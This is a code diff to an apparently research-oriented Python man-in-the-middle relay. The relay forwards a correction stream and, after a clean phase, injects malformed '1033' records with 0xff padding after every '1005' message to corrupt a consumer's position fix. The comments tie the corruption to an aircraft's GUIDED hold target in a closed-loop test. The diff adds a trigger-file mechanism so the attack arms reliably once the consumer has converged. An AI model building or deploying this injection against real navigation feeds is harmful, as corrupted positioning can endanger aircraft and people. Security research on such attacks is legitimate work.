@@ -19,6 +19,7 @@ coordinates, so the 1033 is injected after every 1005 to hold the corruption.
 Consumers then connect to :5911 instead of :5901.
 """
 import argparse
+import os
 import socket
 import sys
 import threading
@@ -88,6 +89,30 @@ def pump(src, dst, splicer, stats):
                 pass
 
 
+def wait_to_arm(args, pump_thread):
+    """
+    Hold off injection until the clean phase is genuinely over.
+
+    Counting seconds from the moment the consumer connects couples the attack
+    to every startup delay ahead of it. In the closed loop that raced: the
+    aircraft armed at t=43.1 s and the relay armed at t=44.2 s, 3.2 s before
+    the aircraft left the ground, so the "clean" hold was never clean and the
+    GUIDED hold target was captured from an already-corrupted position. A
+    trigger file lets the consumer say when it is ready instead.
+
+    Returns False if the consumer disconnected while waiting.
+    """
+    deadline = time.time() + args.delay if args.delay else None
+    while pump_thread.is_alive():
+        if args.trigger:
+            if os.path.exists(args.trigger):
+                return True
+        elif deadline is not None and time.time() >= deadline:
+            return True
+        time.sleep(0.1)
+    return False
+
+
 def main():
     ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
@@ -98,7 +123,17 @@ def main():
     ap.add_argument("--after", type=int, default=1005)
     ap.add_argument("--delay", type=float, default=0.0,
                     help="seconds to forward cleanly before injecting")
+    ap.add_argument("--trigger", metavar="PATH",
+                    help="wait for this file to appear instead of counting "
+                         "seconds. The consumer decides when the clean phase "
+                         "is over, so injection cannot race a slow startup.")
     args = ap.parse_args()
+
+    if args.trigger:
+        try:
+            os.unlink(args.trigger)
+        except FileNotFoundError:
+            pass
 
     host, port = args.upstream.rsplit(":", 1)
     blob = b"A" * 31 + b"\xff" * (args.len - 31) if args.len > 31 else b""
@@ -109,9 +144,14 @@ def main():
     srv.listen(4)
     print(f"relay listening on :{args.listen} -> {args.upstream}", flush=True)
     if args.len:
+        if args.trigger:
+            when = f", on {args.trigger}"
+        elif args.delay:
+            when = f", starting {args.delay:.0f}s in"
+        else:
+            when = ""
         print(f"injecting 1033 rectype len={args.len} after every {args.after}"
-              f"{f', starting {args.delay:.0f}s in' if args.delay else ''}",
-              flush=True)
+              f"{when}", flush=True)
 
     while True:
         cli, addr = srv.accept()
@@ -126,7 +166,7 @@ def main():
         splicer = Splicer(blob) if args.len else None
         stats = {"bytes": 0}
 
-        if splicer and args.delay:
+        if splicer and (args.delay or args.trigger):
             # Forward cleanly first so the consumer can converge on a good fix
             # before anything is injected. Same splicer throughout, with
             # injection armed by setting the message type it triggers on --
@@ -136,10 +176,14 @@ def main():
             t = threading.Thread(target=pump, args=(up, cli, splicer, stats),
                                  daemon=True)
             t.start()
-            time.sleep(args.delay)
-            print(f"--- ATTACK: injecting after every {args.after} ---",
-                  flush=True)
-            splicer.after = args.after
+            armed = wait_to_arm(args, t)
+            if armed:
+                print(f"--- ATTACK: injecting after every {args.after} ---",
+                      flush=True)
+                splicer.after = args.after
+            else:
+                print("--- consumer gone before the attack was armed ---",
+                      flush=True)
             t.join()
         else:
             pump(up, cli, splicer, stats)
